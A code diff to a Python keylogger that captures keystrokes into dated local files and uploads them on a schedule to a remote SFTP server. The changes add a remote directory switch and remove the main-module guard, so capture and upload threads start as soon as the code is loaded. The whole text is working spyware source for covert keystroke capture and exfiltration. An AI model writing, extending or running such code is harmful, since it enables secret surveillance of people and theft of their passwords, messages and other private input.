@@ -18,13 +18,12 @@ def write_key_to_file(key):
 
 
 def upload_logged_keys():
-
     logging.info('uploading logged keys')
     _sftp_server = sftp_server()
+    _sftp_server.chdir(bytes(config.remote_keylogs_dir))
     files = os.listdir(config.local_keylogs_dir)
     today = date.today()
     files = list(filter(lambda file: file if datetime.strptime(file[:8], '%Y%m%d').date() <= today else False, files))
-    logging.info('files## {}'.format(len(files)))
     if len(files) > 0:
         ftp_server = sftp_server()
         for file in files:
@@ -79,10 +78,9 @@ if len(sys.argv) == 2:
         time.sleep(120)
 
 
-if __name__ == '__main__':
-    logging.info('__main__##')
-    t1 = threading.Timer(1, capture_keylogs)
-    t1.start()
-    t2 = threading.Timer(1, upload_logged_keys_schedule)
-    t2.start()
+logging.info('Initing keylogging activities')
+t1 = threading.Timer(1, capture_keylogs)
+t1.start()
+t2 = threading.Timer(1, upload_logged_keys_schedule)
+t2.start()
 
